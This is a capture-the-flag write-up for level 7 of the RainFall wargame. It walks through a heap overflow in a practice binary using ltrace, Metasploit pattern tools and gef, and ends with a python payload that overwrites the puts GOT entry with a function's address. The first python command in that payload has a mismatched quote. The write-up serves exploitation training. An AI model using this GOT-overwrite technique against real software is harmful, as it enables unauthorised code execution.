# Level 7


Another heap overflow challenge, this time we need to reach the second strcpy to overwrite the address of the destination buffer with the GOT address of puts and the source buffer with the address of the function m.
```
┌──(kali㉿kali)-[~/rainfall]
└─$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
__libc_start_main(0x8048521, 2, 0xff82c904, 0x8048610 <unfinished ...>
malloc(8)                                      = 0x93031a0
malloc(8)                                      = 0x93031b0
malloc(8)                                      = 0x93031c0
malloc(8)                                      = 0x93031d0
strcpy(0x93031b0, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x93031b0
strcpy(0x37614136, nil <no return ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Using the pattern_create and pattern_offset tools from metasploit we can find the offset to reach the second strcpy.


```
┌──(kali㉿kali)-[~/rainfall]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 32
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
                                                                             
┌──(kali㉿kali)-[~/rainfall]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 32 -q 0x37614136
[*] Exact match at offset 20
```

The offset is 20, so we need to write 20 bytes to reach the second strcpy.


```
gef➤  got
──────────────────────────────────────────────────────────────── /home/kali/rainfall/level7 ────────────────────────────────────────────────────────────────

GOT protection: No RelRO | GOT functions: 9
 
[0x8049914] printf@GLIBC_2.0  →  0x80483b6
[0x8049918] fgets@GLIBC_2.0  →  0x80483c6
[0x804991c] time@GLIBC_2.0  →  0x80483d6
[0x8049920] strcpy@GLIBC_2.0  →  0xf7cadc20
[0x8049924] malloc@GLIBC_2.0  →  0xf7c9a960
[0x8049928] puts@GLIBC_2.0  →  0x8048406
[0x804992c] __gmon_start__  →  0x8048416
[0x8049930] __libc_start_main@GLIBC_2.0  →  0xf7c23ca0
[0x8049934] fopen@GLIBC_2.1  →  0x8048436
gef➤  p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>
gef➤  
```

The address of the function m is 0x80484f4 and the address of the GOT entry of puts is 0x8049928. We can use the following payload to overwrite the address of the destination buffer with the address of the GOT entry of puts and the source buffer with the address of the function m.

```
level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08" ) $(python -c 'print "\xf4\x84\x04\x08"')
```


